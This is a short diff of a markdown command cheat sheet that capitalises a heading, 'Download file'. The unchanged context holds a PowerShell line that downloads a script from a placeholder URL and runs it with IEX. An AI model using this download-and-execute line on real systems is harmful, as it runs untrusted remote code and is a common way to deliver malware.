@@ -4,7 +4,7 @@
 
 ## Basic commands
 
-### download file
+### Download file
 
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('<url>')`
